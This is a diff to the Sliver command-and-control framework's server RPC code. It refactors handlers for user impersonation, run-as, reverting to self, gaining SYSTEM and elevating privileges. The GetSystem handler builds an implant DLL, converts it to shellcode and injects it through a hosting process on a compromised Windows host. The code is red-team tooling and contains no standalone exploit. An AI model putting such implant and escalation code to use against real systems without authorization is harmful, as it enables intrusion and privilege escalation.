@@ -20,6 +20,7 @@ package rpc
 
 import (
 	"context"
+	"time"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -30,9 +31,9 @@ import (
 )
 
 // Impersonate - Impersonate a remote user
-func (rpc *Server) Impersonate(ctx context.Context, msg *sliverpb.ImpersonateReq) (*sliverpb.Impersonate, error) {
+func (rpc *Server) Impersonate(ctx context.Context, req *sliverpb.ImpersonateReq) (*sliverpb.Impersonate, error) {
 	resp := &sliverpb.Impersonate{}
-	err := rpc.GenericHandler(msg, msg.Request, resp)
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
 	}
@@ -40,9 +41,9 @@ func (rpc *Server) Impersonate(ctx context.Context, msg *sliverpb.ImpersonateReq
 }
 
 // RunAs - Run a remote process as a specific user
-func (rpc *Server) RunAs(ctx context.Context, msg *sliverpb.RunAsReq) (*sliverpb.RunAs, error) {
+func (rpc *Server) RunAs(ctx context.Context, req *sliverpb.RunAsReq) (*sliverpb.RunAs, error) {
 	resp := &sliverpb.RunAs{}
-	err := rpc.GenericHandler(msg, msg.Request, resp)
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
 	}
@@ -50,9 +51,9 @@ func (rpc *Server) RunAs(ctx context.Context, msg *sliverpb.RunAsReq) (*sliverpb
 }
 
 // RevToSelf - Revert process context to self
-func (rpc *Server) RevToSelf(ctx context.Context, msg *sliverpb.RevToSelfReq) (*sliverpb.RevToSelf, error) {
+func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*sliverpb.RevToSelf, error) {
 	resp := &sliverpb.RevToSelf{}
-	err := rpc.GenericHandler(msg, msg.Request, resp)
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
 	}
@@ -60,39 +61,46 @@ func (rpc *Server) RevToSelf(ctx context.Context, msg *sliverpb.RevToSelfReq) (*
 }
 
 // GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
-func (rpc *Server) GetSystem(ctx context.Context, msg *sliverpb.GetSystemReq) (*sliverpb.GetSystem, error) {
-	sliver := core.Hive.Sliver(msg.Request.SessionID)
+func (rpc *Server) GetSystem(ctx context.Context, req *sliverpb.GetSystemReq) (*sliverpb.GetSystem, error) {
+	sliver := core.Hive.Sliver(req.Request.SessionID)
 	if sliver == nil {
 		return nil, ErrInvalidSessionID
 	}
 
-	config := generate.SliverConfigFromProtobuf(gsReq.Config)
+	// TODO: Previously we let the client set the config, now we
+	// 		 just pull it from our version on the server.
+	config := generate.SliverConfigFromProtobuf(sliver.Config())
+
 	config.Format = clientpb.ImplantConfig_SHARED_LIB
 	config.ObfuscateSymbols = false
 	dllPath, err := generate.SliverSharedLibrary(config)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
 	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
 	data, _ := proto.Marshal(&sliverpb.GetSystemReq{
 		Data:           shellcode,
-		HostingProcess: gsReq.HostingProcess,
-		SliverID:       gsReq.SliverID,
+		HostingProcess: req.HostingProcess,
+		Request:        req.GetRequest(),
 	})
 
+	timeout := time.Duration(req.Request.Timeout)
 	data, err = sliver.Request(sliverpb.MsgGetSystemReq, timeout, data)
-	resp(data, err)
+	getSystem := &sliverpb.GetSystem{}
+	err = proto.Unmarshal(data, getSystem)
+	if err != nil {
+		return nil, err
+	}
+	return getSystem, nil
 }
 
 // Elevate - Attempt to elevate remote privileges
-func (rpc *Server) Elevate(ctx context.Context, msg *sliverpb.ElevateReq) (*sliverpb.Elevate, error) {
+func (rpc *Server) Elevate(ctx context.Context, req *sliverpb.ElevateReq) (*sliverpb.Elevate, error) {
 	resp := &sliverpb.Elevate{}
-	err := rpc.GenericHandler(msg, msg.Request, resp)
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
 	}
